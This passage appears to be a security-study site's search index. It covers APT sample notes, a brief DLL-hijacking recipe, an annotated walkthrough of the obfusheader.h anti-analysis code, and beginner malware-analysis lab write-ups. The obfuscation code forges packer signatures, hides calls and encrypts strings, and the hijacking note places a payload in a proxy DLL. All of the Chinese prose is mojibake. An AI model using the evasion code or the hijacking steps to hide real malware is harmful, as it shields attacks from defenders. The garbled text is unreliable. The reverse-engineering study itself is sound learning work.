ä¹‹ååœ¨ç‰¹å®šçš„ç›®å½•ä¸‹æ‰¾ç‰¹å®šçš„æ–‡ä»¶ï¼Œä¸è¿‡å®ƒçš„å­—ç¬¦ä¸²çš„å˜æ¢æ“ä½œæˆ‘æ²¡æœ‰çœ‹æ˜ç™½ã€‚è€Œä¸”ä¸ä¹‹å‰å€’è½¬å­—ç¬¦ä¸²çš„å‡½æ•°å¾ˆç›¸ä¼¼ï¼Œéƒ½æœ‰ä¸0x7FFFFFFFFFFFFFFEè¿›è¡Œæ¯”è¾ƒä¹‹ç±»çš„æ“ä½œã€‚\nåé¢çš„è¡Œä¸ºä¸ä¹‹å‰çš„ä¸€ä¸ªå‡½æ•°ä¹Ÿæ¯”è¾ƒç›¸ä¼¼ï¼Œä¼¼ä¹æ˜¯å¯¹é«˜ç²¾åº¦æ—¶é—´è¿›è¡Œçš„æ“ä½œï¼š\nperf_frequency = Query_perf_frequency(); perf_counter = Query_perf_counter(); "},"title":"APTs"},"/docs/remaining/bypass/":{"data":{"":"","#":"DLLåŠ«æŒ å¯¼å…¥è¦åŠ«æŒçš„DLLï¼Œä½¿ç”¨AheadLib+ç”Ÿæˆæ¨¡æ¿ åœ¨å…¥å£å‡½æ•°å¤„ç¼–å†™payload å°†è½¬å‘DLLæ”¾åˆ°åŸDLLåŒç›®å½•ä¸‹ï¼Œå¹¶å°†åŸDLLæ”¹å "},"title":"Bypass"},"/docs/remaining/itemlearn/":{"data":{"":"","#":"obfusheader.h çœŸçš„ä¸èœ\nOBFUSCATION\nä¼ªé€ å‡çš„æ®µåç§°ï¼Œä¹Ÿå°±æ˜¯ä¼ªç­¾å\nä¸è¿‡è¿™ä¸ªä¼ªé€ ä¼¼ä¹å¯¹æˆ‘çš„dieå½±å“ä¸å¤§ï¼ˆè¯è¯´dieä¸æ˜¯æ›´å…·ç‰¹å¾ç è¯†åˆ«ä¿æŠ¤çš„å—ï¼Ÿï¼‰\n#if FAKE_SIGNATURES \u0026\u0026 defined(_WINDOWS) \u0026\u0026 !KERNEL_MODE #ifdef _MSC_VER #pragma section(\".arch\") #pragma section(\".srdata\") #pragma section(\".xpdata\") #pragma section(\".xdata\") #pragma section(\".xtls\") #pragma section(\".themida\") #pragma section(\".vmp0\") #pragma section(\".vmp1\") #pragma section(\".vmp2\") #pragma section(\".enigma1\") #pragma section(\".enigma2\") #pragma section(\".dsstext\") #endif // https://enigmaprotector.com FAKE_SIG(_enigma1, \".enigma1\", 0); FAKE_SIG(_enigma2, \".enigma2\", 0); // https://vmpsoft.com (opensource) FAKE_SIG(_vmp1, \".vmp0\", 0); FAKE_SIG(_vmp2, \".vmp1\", 0); FAKE_SIG(_vmp3, \".vmp2\", 0); // DENUVO FAKE_SIG(_denuvo1, \".arch\", 0); FAKE_SIG(_denuvo2, \".srdata\", 0); FAKE_SIG(_denuvo3, \".xdata\", 0); FAKE_SIG(_denuvo4, \".xpdata\", 0); FAKE_SIG(_denuvo5, \".xtls\", \"\\x64\\x65\\x6E\\x75\\x76\\x6F\\x5F\\x61\\x74\\x64\\x00\\x00\\x00\\x00\\x00\\x00\"); // THEMIDA FAKE_SIG(_themida1, \".themida\", 0); // SECUROM FAKE_SIG(_securom1, \".dsstext\", 0); #endif ç”Ÿæˆéšæœºæ•°ç§å­\nå…³é”®å­—constexprï¼šå˜é‡æˆ–å‡½æ•°çš„å€¼å¯ä»¥åœ¨ç¼–è¯‘æ—¶ç¡®å®šã€‚\n__TIME__ï¼šåœ¨ç¼–è¯‘æ—¶è¢«æ›¿æ¢ä¸ºä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºæºä»£ç è¢«ç¼–è¯‘çš„æ—¶é—´ã€‚\n__LINE__ï¼šç¼–è¯‘æ—¶è¢«æ›¿æ¢ä¸ºå½“å‰æºä»£ç çš„è¡Œå·ã€‚\n__COUNTER__ï¼šåœ¨è¿™ä¸ªä»£ç ä¸­æ˜¯æ¯æ¬¡è°ƒç”¨CTimeSeedåéƒ½ä¼šå¢åŠ 1ã€‚\n#ifdef __cplusplus // using constexpr allows us to avoid embeding XX:XX:XX into the binary static constexpr int CTime = __TIME__[0] + __TIME__[1] + __TIME__[3] + __TIME__[4] + __TIME__[6] + __TIME__[7]; //å°†ç¼–è¯‘çš„æ—¶é—´æ±‚å’Œ #define CTimeSeed ((__COUNTER__ + CTime) * 2654435761u) //æ–æ³¢é‚£å¥‘æ•£åˆ—å¸¸æ•°å—ï¼Ÿ #else // for C we cannot base it on __TIME__, since there's no constexpr, or XX:XX:XX will be added to the binary #define CTimeSeed ((__COUNTER__ + __LINE__) * 2654435761u) #endif #define RND(Min, Max) (Min + (CTimeSeed % (Max - Min + 1))) æ··æ·†çš„çœŸå‡å¼‚æˆ–é—¨\nä¸ç®¡è¿™ä¸ªRND(1, 10)ï¼ˆä»1åˆ°10ä¹‹é—´éšæœºå–ä¸€ä¸ªæ•°ï¼‰å–å¤šå°‘ï¼Œä¸‹é¢çš„çœŸè¿˜æ˜¯çœŸï¼Œå‡ä¹Ÿæ˜¯å‡ï¼Œå’Œè‡ªå·±å®ç°äº†ä¸€ä¸ªå¼‚æˆ–é—¨ã€‚\n#define _RND RND(1, 10) #define _TRUE ((((_9 + __7() + ((_RND * __2()) * __0()))) / _8) - _1) #define _FALSE ((_3 + __6() + ((_RND * __3()) * _0)) - __9()) #define XOR(x, y) (x + y - (2 * (x \u0026 y))) å®šä¹‰é™æ€å­—ç¬¦ä¸²\nåº”è¯¥æ˜¯ä¸è®©ç›´æ¥æœç´¢å‡ºæ¥å­—ç¬¦ä¸²å§ï¼Œä¸è¿‡åé¢çš„å®šä¹‰ç±»ä¼¼å‡½æ•°çš„æ•°å­—ç¡®å®å¾ˆæœ‰ç”¨ï¼Œidaç›´æ¥å‡å¤©ã€‚\n// Use stored in static memory essential bytes for hardcoded cflow blocks \u0026 expressions #if CFLOW_CONST_DECRYPTION || CFLOW_BRANCHING static volatile char _a = 'a', _b = 'b', _c = 'c', _d = 'd', _e = 'e', _f = 'f', _g = 'g', _h = 'h', _i = 'i', _j = 'j', _k = 'k', _l = 'l', _m = 'm', _n = 'n', _o = 'o', _p = 'p', _q = 'q', _r = 'r', _s = 's', _t = 't', _u = 'u', _v = 'v', _w = 'w', _x = 'x', _y = 'y', _z = 'z', _S = 'S', _L = 'L', _A = 'A', _I = 'I', _D = 'D', _P = 'P'; static volatile char _0 = 0, _1 = 1, _2 = 2, _3 = 3, _4 = 4, _5 = 5, _6 = 6, _7 = 7, _8 = 8, _9 = 9; // Same trick with NOINLINED functions (proxies) static NOINLINE char __0() { return 0; } static NOINLINE char __1() { return 1; } static NOINLINE char __2() { return 2; } static NOINLINE char __3() { return 3; } static NOINLINE char __4() { return 4; } static NOINLINE char __5() { return 5; } static NOINLINE char __6() { return 6; } static NOINLINE char __7() { return 7; } static NOINLINE char __8() { return 8; } static NOINLINE char __9() { return 9; } #endif æ„é€ çœŸå‡åˆ¤æ–­\n// Easily build hardcoded control-flow protection blocks #define BLOCK_COND(cond, block) if (cond) { block; } #define BLOCK_TRUE(block) BLOCK_COND(_TRUE, block) //if (true) { block; }ä¹Ÿå°±æ˜¯æ’æ‰§è¡Œ #define BLOCK_FALSE(block) BLOCK_COND(_FALSE, block) //è‡ªç„¶æ˜¯æ’ä¸æ‰§è¡Œ åé™æ€åˆ†æ\nå…¶å®å°±æ˜¯æ·»åŠ æ’è·³è½¬çš„èŠ±æŒ‡ä»¤ï¼Œå¦‚ä¸‹ï¼š\nxor eax, eax jz loc_real _emit 0x00 loc_real: æ··æ·†\nè¯»å–0åˆ°0x7FFFFFä¸­çš„éšæœºä¸€ä¸ªå€¼çš„åœ°å€ï¼Œæœ‰å¯èƒ½ä¼šå‘ç”Ÿæ®µé”™è¯¯ã€‚\nä¸‹é¢å®šä¹‰çš„int_proxyå‡½æ•°å…¶å®å°±æ˜¯å‚æ•°æ˜¯å¤šå°‘å°±è¿”å›å¤šå°‘ï¼Œä¸€ä¸ªæ··æ·†ã€‚\n#define SEGFAULT int_proxy(*(int*)RND(0, 0x7FFFFF)) #if CFLOW_CONST_DECRYPTION || CFLOW_BRANCHING volatile static INLINE int int_proxy(double val) { INDIRECT_BRANCH; volatile double a = val * ((double)_7 - ((double)_3 * 2)); BLOCK_TRUE( BLOCK_FALSE( return _RND; ) ) BLOCK_TRUE( loc_end: if (_RND) return a * _TRUE; loc_fake: return _RND; ) } #endif å˜²è®½\nå…¶å®å°±æ˜¯æ„é€ äº†ä¸€ä¸ªå‡å‡½æ•°ï¼Œç„¶åâ€¦â€¦å¹¶ä¸ä¼šæ‰§è¡Œåˆ°è¿™ã€‚\nstatic void obfusheader_watermark_hook(const char* param) {} // to avoid crashing we assign a real func typedef volatile void(*draw_ptr) (const char*); // define a draw function static volatile draw_ptr obfusheader_watermark_orig = (draw_ptr)obfusheader_watermark_hook; // assign draw_orig to avoid segfault // Binary watermarking for IDA/GHIDRA that bypasses compiler optimizations #define WATERMARK(...)\\ const char * data[] = {__VA_ARGS__};\\ for (volatile int i = 0; i \u003csizeof(data)/sizeof(data[0]); i++)\\ obfusheader_watermark_orig(data[i]); static volatile void obfusheader_decoy_main() { WATERMARK(\"Stop reversing the binary\", // Message for crackers ;) \"Reconsider your life choices\", \"And go touch some grass\", 0); } // Fake decoy functions to hide the original one (for call hiding) static void obfusheader_decoy_1() { obfusheader_decoy_main(); } static void obfusheader_decoy_2() { obfusheader_decoy_main(); } static void obfusheader_decoy_3() { obfusheader_decoy_main(); } static void obfusheader_decoy_4() { obfusheader_decoy_main(); } static void obfusheader_decoy_5() { obfusheader_decoy_main(); } static void obfusheader_decoy_6() { obfusheader_decoy_main(); } static void obfusheader_decoy_7() { obfusheader_decoy_main(); } static void obfusheader_decoy_8() { obfusheader_decoy_main(); } static void obfusheader_decoy_9() { obfusheader_decoy_main(); } static void obfusheader_decoy_10() { obfusheader_decoy_main(); } åŠ å¯†ä¸è§£å¯†\nobfuscatoråŠ å¯†åº”è¯¥å°±æ˜¯ç®€å•çš„æ•°æ®ä¸keyå¼‚æˆ–çš„è¿ç®—\n// Normal \u0026 threadlocal encryption modes #define OBF_KEY_NORMAL(x, type, size, key) []() {\\ constexpr static auto result = obf::obfuscator\u003ctype, size, key\u003e(x);\\ return result; }() //è°ƒç”¨lambdaè¡¨è¾¾å¼ï¼Œåªæœ‰å®æ²¡æœ‰åç§°ï¼Œè¿›è¡ŒåŠ å¯† #define OBF_KEY_THREADLOCAL(x, type, size, key) []() {\\ constexpr static auto data = obf::obfuscator\u003ctype, size, key\u003e(x);\\ thread_local auto decryptor = obf::decryptor\u003ctype, size, key\u003e(data);\\ return decryptor; }() //çº¿ç¨‹ä¸­éƒ½æœ‰ä¸€ä¸ªè§£å¯†å®ä¾‹ï¼Œåœ¨çº¿ç¨‹ä¸­è§£å¯† #define MAKEOBF_NORMAL(x) OBF_KEY_NORMAL(x, obf::clean_type\u003cdecltype(obf::gettype(x))\u003e, obf::getsize(x), (char)RND(1, 255)) #define MAKEOBF_THREADLOCAL(x) OBF_KEY_THREADLOCAL(x, obf::clean_type\u003cdecltype(obf::gettype(x))\u003e, obf::getsize(x), (char)RND(1, 255)) //ç”Ÿæˆå¯†é’¥ #if CONST_ENCRYPTION #if CONST_ENCRYPT_MODE == NORMAL #define MAKEOBF(x) MAKEOBF_NORMAL(x) #elif CONST_ENCRYPT_MODE == THREADLOCAL #define MAKEOBF(x) MAKEOBF_THREADLOCAL(x) #endif #define OBF(x) ((meta::decay_t\u003cdecltype(x)\u003e) MAKEOBF(x)) #else #define MAKEOBF(x) x #define OBF(x) x #endif åé¢çš„å‘½åç©ºé—´ä¼¼ä¹æ˜¯å¯¹ç¼–è¯‘æ–‡ä»¶çš„ä¸€äº›æ“ä½œï¼Œå°±å…ˆè·³è¿‡\nåˆä¸€ä¸ªæ··æ·†\nä¹‹å‰çš„é‚£ä¸ªæ°¸çœŸifä¸æ°¸å‡ifä»¥åŠè‡ªå·±å®ç°çš„å¼‚æˆ–ï¼Œè¿›è¡ŒæŒ¨ä¸ªä¸key+iè¿›è¡Œå¼‚æˆ–æ“ä½œ\ntemplate \u003cclass T, char key, size_t size\u003e INLINE void xord(T* data) { #if CFLOW_CONST_DECRYPTION for (volatile int i = 0; i \u003c size; i++) { BLOCK_FALSE( data[i] = XOR(data[i], int_proxy(key + 1)); //ä¸æ‰§è¡Œ ) BLOCK_TRUE( //int_proxyä¹‹å‰åˆ†æçš„å°±æ˜¯è¾“å…¥å‡ è¾“å‡ºå°±æ˜¯å‡  BLOCK_FALSE( data[i] = XOR(data[i], int_proxy(key + 2)); //ä¸æ‰§è¡Œ ); BLOCK_FALSE( data[i] = XOR(data[i], int_proxy(key + 3)); //ä¸æ‰§è¡Œ ); BLOCK_TRUE( data[i] = XOR(data[i], CAST(T, int_proxy(key + i))); // real ) ) BLOCK_FALSE( data[i] = XOR(data[i], int_proxy(key + 4)); //ä¸æ‰§è¡Œ ) } #else for (volatile int i = 0; i \u003c size; i++) data[i] = data[i] ^ CAST(T, key + i); // no cflow (optimized+unsafe) #endif } è¿˜æ˜¯ä¸€ä¸ªå¼‚æˆ–ä¸è§£å¯†\nå®ç°äº†å•å€¼ä¸å¤šå€¼ä¸¤ä¸ªç‰ˆæœ¬ï¼Œå¼‚æˆ–åŠ å¯†ä¸å¼‚æˆ–è§£å¯†\ntemplate \u003cclass T, size_t size, char key\u003e class obfuscator { public: constexpr obfuscator(const T* data) { for (int i = 0; i \u003c size; i++) m_data[i] = data[i] ^ CAST(T, key + i); } constexpr obfuscator(const T data) { m_data[0] = data ^ key; } INLINE T* decrypt() { //è§£å¯† if (!decrypted) { xord\u003cT, key, size\u003e(m_data); } decrypted = true; return m_data; } INLINE operator T* () { return decrypt(); } INLINE operator T () { return decrypt()[0]; } bool decrypted = false; T m_data[size]{}; }; template \u003cclass T, size_t size, char key\u003e class decryptor { public: INLINE decryptor(const obfuscator\u003cT, size, key\u003e data) { for (int i = 0; i \u003c size; i++) m_data[i] = data.m_data[i]; //å°†åŠ å¯†æ•°æ®ä»obfuscatorè½¬ç§»è¿‡æ¥ } INLINE T* decrypt() { //è§£å¯† if (!decrypted) { xord\u003cT, key, size\u003e(m_data); } decrypted = true; return m_data; } INLINE operator T* () { return decrypt(); } INLINE operator T () { return decrypt()[0]; } bool decrypted = false; T m_data[size]{}; }; éšè—å‡½æ•°æŒ‡é’ˆ\nåˆ›å»ºäº†ä¸€ä¸ªå‡½æ•°åœ°å€çš„æ•°ç»„ï¼Œé‡Œé¢æœ‰éšæœºæ•°ï¼Œå‡å‡½æ•°åœ°å€ï¼Œæ•°ç»„æœ€åä¸€ä¸ªæ˜¯çœŸå‡½æ•°åœ°å€ã€‚ç„¶åæœ‰ä¸¤ç§å¯»æ‰¾å‡½æ•°åœ°å€çš„æ–¹å¼ï¼Œå¦‚æœindex == real_indexåˆ™è¿”å›æ•°ç»„ä¸­ç¬¬Nä¸ªï¼ˆæ˜¯çœŸçš„åœ°å€ï¼Œå› ä¸ºæ•°ç»„é•¿åº¦ä¸ºN+1ï¼‰ï¼Œå¦åˆ™è¿”å›ç¬¬indexä¸ªã€‚\ntemplate \u003ctypename T, int N, int real_index, T real_value, int index\u003e constexpr T select_func() { T funcs[N + 1] = { RCAST(T, (char*)_RND), RCAST(T, obfusheader_decoy_1), RCAST(T, obfusheader_decoy_2), RCAST(T, obfusheader_decoy_3), RCAST(T, (char*)_RND), RCAST(T, 0), RCAST(T, (char*)_RND), RCAST(T, obfusheader_decoy_5), RCAST(T, (char*)_RND), RCAST(T, (char*)_RND), RCAST(T, real_value) }; if (index == real_index) // Index of the real func return funcs[N]; return reinterpret_cast\u003cT\u003e(funcs[index]); } template \u003ctypename T, int N, int real_index, T real_value, int... indices\u003e struct FunctionPtrHider { static T shuffled_arr[N]; }; template \u003ctypename T, int N, int real_index, T real_value, int... indices\u003e T FunctionPtrHider\u003cT, N, real_index, real_value, indices...\u003e::shuffled_arr[N] = { select_func\u003cT, N, real_index, real_value, indices\u003e()... }; åœ¨cé‡Œé¢ç›´æ¥ç¦ç”¨æ··æ·†ï¼š\n#else // C doesn't support compile-time encryption cause no constexpr sadly :( So we just implement it like this \u0026 disable everything #define OBF(x) x #define CALL(ptr, ...) ((ptr)(__VA_ARGS__)) #define HIDE_PTR(ptr) (ptr) ç¬¦å·è°ƒç”¨éšè—\nlinuxä¸å®‰å“å¹³å°ä½¿ç”¨åŠ¨æ€é“¾æ¥åº“å‡½æ•°dlsymä»é»˜è®¤ç¬¦å·è¡¨ä¸­æŸ¥æ‰¾ç¬¦å·ï¼Œwindowså¹³å°å°±loadè¦ç”¨çš„dllä¹‹åGetProcAddresså°±å¯ä»¥æ‰¾åˆ°äº†ã€‚ï¼ˆé¿å…åœ¨ä»£ç ä¸­ç¡¬ç¼–ç å‡½æ•°åœ°å€IATï¼‰\n// Symbol - based call hiding(different for Linux\u0026 windows) #if defined(__linux__) || defined(__ANDROID__) #define CALL_EXPORT(mtd, def) ((def)(dlsym(RTLD_DEFAULT, OBF(mtd)))) #elif defined(_WINDOWS) #define CALL_EXPORT(lib, mtd, def) ((def)(GetProcAddress(LoadLibraryA(lib), mtd))) #endif #endif å½±å“æ€§èƒ½çš„æ··æ·†\nå…¶å®å°±æ˜¯å°†è¿™äº›å¸¸ç”¨çš„æ¡ä»¶è·³è½¬ä¸è¿”å›è‡ªå·±å®ç°äº†ä¸€ä¸ªæ··æ·†çš„ç‰ˆæœ¬\n#if CFLOW_BRANCHING #define if(x) if (_TRUE) if (int_proxy((long long)(x)) * _TRUE \u0026\u0026 _RND) #define for(x) for (int _i=0; _i\u003cint_proxy(_TRUE);_i++) for (x) #define while(x) while(int_proxy((long long)(x)) * _TRUE \u0026\u0026 _RND) #define switch(x) switch(int_proxy((long long)(x)) * _TRUE) #define return for (int _i=0; _i\u003cRND(1, 100);_i++) return // This will hurt (Some compilers don't allow this, disable if fails) #define else else\\ BLOCK_FALSE(\\ int_proxy(_RND);\\ BLOCK_TRUE(\\ int_proxy(_RND);\\ )\\ ) else #endif MODULES\nå…¶å®å°±æ˜¯è‡ªå·±å®ç°äº†ä¸€äº›å¸¸ç”¨çš„å­—ç¬¦ä¸²æ“ä½œçš„å‡½æ•°\nXAntiDebug çœŸçš„ä¸èœ\nè¿™ä¸ªåè°ƒè¯•ä»£ç å‡½æ•°XAD_Initializeä¸ºåè°ƒè¯•åˆå§‹åŒ–ï¼ŒXAD_ExecuteDetectå‡½æ•°ä¸ºæ£€æµ‹è°ƒè¯•ã€‚å…ˆçœ‹åˆå§‹åŒ–å§\n1"},"title":"ItemLearn"},"/docs/remaining/lab/":{"data":{"":"","æ¶æ„ä»£ç åˆ†æå®æˆ˜çš„å®éªŒ#ã€Šæ¶æ„ä»£ç åˆ†æå®æˆ˜ã€‹çš„å®éªŒ":"Lab 1-1 ---------------- Lab01-01.exe Lab01-01.dll ---------------- -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= å®éªŒå†…å®¹ï¼š 1ã€å°†æ–‡ä»¶ä¸Šä¼ åˆ°http://www.VirusTotal.com è¿›è¡Œåˆ†æå¹¶æŸ¥çœ‹æŠ¥å‘Šã€‚æ–‡ä»¶åŒ¹é…åˆ°äº†å·²æœ‰çš„åç—…æ¯’è½¯ä»¶ç‰¹å¾å—ï¼Ÿ 2ã€è¿™äº›æ–‡ä»¶æ˜¯ä»€ä¹ˆæ—¶å€™ç¼–è¯‘çš„ï¼Ÿ 3ã€è¿™ä¸¤ä¸ªæ–‡ä»¶ä¸­æ˜¯å¦å­˜åœ¨è¿¹è±¡è¯´æ˜ä»–ä»¬æ˜¯å¦è¢«åŠ å£³æˆ–æ··æ·†äº†ï¼Ÿå¦‚æœæ˜¯ï¼Œè¿™äº›è¿¹è±¡åœ¨å“ªé‡Œï¼Ÿ 4ã€æ˜¯å¦æœ‰å¯¼å…¥å‡½æ•°æ˜¾ç¤ºå‡ºäº†è¿™ä¸ªæ¶æ„ä»£ç æ˜¯åšä»€ä¹ˆçš„ï¼Ÿå¦‚æœæ˜¯ï¼Œæ˜¯å“ªäº›å¯¼å…¥å‡½æ•°ï¼Ÿ 5ã€æ˜¯å¦æœ‰ä»»ä½•å…¶ä»–æ–‡ä»¶æˆ–åŸºäºä¸»æœºçš„è¿¹è±¡ï¼Œè®©ä½ å¯ä»¥åœ¨å—æ„ŸæŸ“ç³»ç»Ÿä¸ŠæŸ¥æ‰¾ï¼Ÿ 6ã€æ˜¯å¦æœ‰åŸºäºç½‘ç»œçš„è¿¹è±¡ï¼Œå¯ä»¥ç”¨æ¥å‘ç°å—æ„ŸæŸ“æœºå™¨ä¸Šçš„è¿™ä¸ªæ¶æ„ä»£ç ï¼Ÿ 7ã€ä½ çŒœè¿™äº›æ–‡ä»¶çš„ç›®çš„æ˜¯å¹²ä»€ä¹ˆçš„ï¼Ÿ -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= ![image](https://c65mael.github.io/static/myassets-Lab/1-1 1.png)\n![image](https://c65mael.github.io/static/myassets-Lab/1-1 2.png)\né€šè¿‡peå·¥å…·æŸ¥çœ‹æ—¶é—´æˆ³ï¼Œå‘ç°ä¸¤ä¸ªæ–‡ä»¶çš„ç¼–è¯‘æ—¶é—´ï¼š\n![image](https://c65mael.github.io/static/myassets-Lab/1-1 3.png)\n![image](https://c65mael.github.io/static/myassets-Lab/1-1 4.png)\nä¸¤ä¸ªæ–‡ä»¶éƒ½ç”¨dieæŸ¥ä¸€ä¸‹å£³ï¼š\n![image](https://c65mael.github.io/static/myassets-Lab/1-1 5.png)\n![image](https://c65mael.github.io/static/myassets-Lab/1-1 6.png)\nå‘ç°äºŒè€…æ²¡æœ‰å£³ï¼Œä½†æ˜¯å…³äºè¿™ä¸ªdllæ–‡ä»¶æ²¡æœ‰å¯¼å‡ºè¡¨ï¼š\n![image](https://c65mael.github.io/static/myassets-Lab/1-1 7.png)\nçœ‹ä¸€ä¸‹exeæ–‡ä»¶çš„å¯¼å…¥è¡¨ï¼Œå°±æ˜¯è¿™ä¸ªæ–‡ä»¶ç”¨äº†å“ªäº›ç³»ç»Ÿå‡½æ•°ï¼š\n![image](https://c65mael.github.io/static/myassets-Lab/1-1 8.png)\nè¿™ä¸¤ä¸ªAPIçš„åŠŸèƒ½æ˜¯é€šå¸¸ç”¨äºæšä¸¾æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶ã€‚\nç”¨è®°äº‹æœ¬æ‰“å¼€exeæ–‡ä»¶å¯ä»¥çœ‹åˆ°å¯èƒ½å¯¹C:\\Windows\\System32\\Kernel32.dllè¿›è¡Œäº†æŸäº›æ“ä½œï¼š\n![image](https://c65mael.github.io/static/myassets-Lab/1-1 9.png)\nåŒæ ·ç”¨è®°äº‹æœ¬æ‰“å¼€dllæ–‡ä»¶ï¼Œå¯ä»¥çœ‹åˆ°ä¸€ä¸ªipåœ°å€ï¼š\n![image](https://c65mael.github.io/static/myassets-Lab/1-1 10.png)\nåˆ›é€ ä¸€ä¸ªåé—¨ä»€ä¹ˆçš„å§ğŸ¥²\nLab 1-2 ---------------- Lab01-02.exe ---------------- -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= å®éªŒå†…å®¹ï¼š 1ã€å°†æ–‡ä»¶ä¸Šä¼ åˆ°http://www.VirusTotal.com è¿›è¡Œåˆ†æå¹¶æŸ¥çœ‹æŠ¥å‘Šã€‚æ–‡ä»¶åŒ¹é…åˆ°äº†å·²æœ‰çš„åç—…æ¯’è½¯ä»¶ç‰¹å¾å—ï¼Ÿ 2ã€æ˜¯å¦æœ‰è¿™ä¸ªæ–‡ä»¶è¢«åŠ å£³æˆ–æ··æ·†çš„ä»»ä½•è¿¹è±¡ï¼Ÿå¦‚æœæ˜¯è¿™æ ·ï¼Œè¿™äº›è¿¹è±¡æ˜¯ä»€ä¹ˆï¼Ÿå¦‚æœè¯¥æ–‡ä»¶è¢«åŠ å£³ï¼Œè¯·è¿›è¡Œè„±å£³ã€‚ 3ã€æœ‰æ²¡æœ‰ä»»ä½•å¯¼å…¥å‡½æ•°èƒ½å¤Ÿæš—ç¤ºå‡ºè¿™ä¸ªç¨‹åºçš„åŠŸèƒ½ï¼Ÿå¦‚æœæ˜¯ï¼Œæ˜¯å“ªäº›å¯¼å…¥å‡½æ•°ï¼Œä»–ä»¬ä¼šå‘Šè¯‰ä½ ä»€ä¹ˆï¼Ÿ 4ã€å“ªäº›åŸºäºä¸»æœºæˆ–åŸºäºç½‘ç»œçš„è¿¹è±¡å¯ä»¥è¢«ç”¨æ¥ç¡®å®šè¿™ä¸ªæ¶æ„ä»£ç æ„ŸæŸ“çš„æœºå™¨ï¼Ÿ -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= ![image](https://c65mael.github.io/static/myassets-Lab/1-1 11.png)\nç”¨dieæŸ¥å£³å‘ç°æ˜¯upxå£³ï¼Œåœ¨è¿™ä¸ªç½‘å€ä¸‹è½½upxåŠ å£³å™¨åå°†å¯¹åº”æ–‡ä»¶æ”¾åˆ°ç›®å½•ä¸‹åè¾“å…¥è„±å£³æŒ‡ä»¤ï¼š\nupx -d Lab01-02.exe é¢ï¼Œå°±å¥½äº†ã€‚\n![image](https://c65mael.github.io/static/myassets-Lab/1-1 12.png)\nç”¨è®°äº‹æœ¬æ‰“å¼€ç¨‹åºï¼š\n![image](https://c65mael.github.io/static/myassets-Lab/1-1 13.png)\nå¯ä»¥çœ‹åˆ°ä¸€ä¸ªä¸€ä¸ªç½‘å€ï¼Œæ¶æ„ä»£ç å¯èƒ½æ˜¯æƒ³è¿æ¥åˆ°è¯¥ç½‘å€ã€‚\nLab 1-3 ---------------- Lab01-03.exe ---------------- -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= å®éªŒå†…å®¹ï¼š 1ã€å°†æ–‡ä»¶ä¸Šä¼ åˆ°http://www.VirusTotal.com è¿›è¡Œåˆ†æå¹¶æŸ¥çœ‹æŠ¥å‘Šã€‚æ–‡ä»¶åŒ¹é…åˆ°äº†å·²æœ‰çš„åç—…æ¯’è½¯ä»¶ç‰¹å¾å—ï¼Ÿ 2ã€æ˜¯å¦æœ‰è¿™ä¸ªæ–‡ä»¶è¢«åŠ å£³æˆ–æ··æ·†çš„ä»»ä½•è¿¹è±¡ï¼Ÿå¦‚æœæ˜¯è¿™æ ·ï¼Œè¿™äº›è¿¹è±¡æ˜¯ä»€ä¹ˆï¼Ÿå¦‚æœè¯¥æ–‡ä»¶è¢«åŠ å£³ï¼Œè¯·è¿›è¡Œè„±å£³ã€‚ 3ã€æœ‰æ²¡æœ‰ä»»ä½•å¯¼å…¥å‡½æ•°èƒ½å¤Ÿæš—ç¤ºå‡ºè¿™ä¸ªç¨‹åºçš„åŠŸèƒ½ï¼Ÿå¦‚æœæ˜¯ï¼Œæ˜¯å“ªäº›å¯¼å…¥å‡½æ•°ï¼Œä»–ä»¬ä¼šå‘Šè¯‰ä½ ä»€ä¹ˆï¼Ÿ 4ã€å“ªäº›åŸºäºä¸»æœºæˆ–åŸºäºç½‘ç»œçš„è¿¹è±¡å¯ä»¥è¢«ç”¨æ¥ç¡®å®šè¿™ä¸ªæ¶æ„ä»£ç æ„ŸæŸ“çš„æœºå™¨ï¼Ÿ -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= ![image](https://c65mael.github.io/static/myassets-Lab/1-1 14.png)\nå°†exeæ–‡ä»¶æ‹–å…¥linxerUnpackerä¸­ï¼Œå•å‡»\"å£³ç‰¹å¾è„±å£³\"ï¼ŒæˆåŠŸè„±å£³ã€‚\n![image](https://c65mael.github.io/static/myassets-Lab/1-1 15.png)\nç”¨è®°äº‹æœ¬æ‰“å¼€ç¨‹åºï¼š\n![image](https://c65mael.github.io/static/myassets-Lab/1-1 16.png)\nå¯ä»¥çœ‹åˆ°ä¸€ä¸ªä¸€ä¸ªç½‘å€ã€‚\nLab 1-4 ---------------- Lab01-04.exe ---------------- -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= å®éªŒå†…å®¹ï¼š 1ã€å°†æ–‡ä»¶ä¸Šä¼ åˆ°http://www.VirusTotal.com è¿›è¡Œåˆ†æå¹¶æŸ¥çœ‹æŠ¥å‘Šã€‚æ–‡ä»¶åŒ¹é…åˆ°äº†å·²æœ‰çš„åç—…æ¯’è½¯ä»¶ç‰¹å¾å—ï¼Ÿ 2ã€æ˜¯å¦æœ‰è¿™ä¸ªæ–‡ä»¶è¢«åŠ å£³æˆ–æ··æ·†çš„ä»»ä½•è¿¹è±¡ï¼Ÿå¦‚æœæ˜¯è¿™æ ·ï¼Œè¿™äº›è¿¹è±¡æ˜¯ä»€ä¹ˆï¼Ÿå¦‚æœè¯¥æ–‡ä»¶è¢«åŠ å£³ï¼Œè¯·è¿›è¡Œè„±å£³ã€‚ 